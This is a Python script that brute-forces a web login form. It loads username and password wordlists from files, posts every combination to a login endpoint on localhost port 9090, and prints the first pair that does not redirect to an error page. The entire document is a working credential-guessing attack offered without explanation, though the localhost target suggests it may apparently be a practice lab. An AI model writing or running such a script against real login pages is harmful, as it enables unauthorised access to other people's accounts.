import requests
import sys
usernames=[]
passwords=[]
with open("ethiopia.txt","r") as f:
    usernames+=[usr.strip() for usr in f]
with open("SubD.txt","r") as f:
    passwords+=[pas.strip() for pas in f]
c=0
print("[+] Trying posiblity (absolute form UsrN,PassW):", len(passwords)*len(usernames))
for username in usernames:
    for password in passwords:
        config={
            "username":username,
            "password":password
            }
        s=requests.post("http://127.0.0.1:9090/login",params=config)
        if "error" != s.url.split("/")[-1][6:11]:
            print("\n[+]Sucssus")
            print(f"[*] Correct username:password => {username}:{password}")
            sys.exit()
        else:
            c+=1
            print(f"Not Found=> {c}",end="\r")
print(s.status_code)
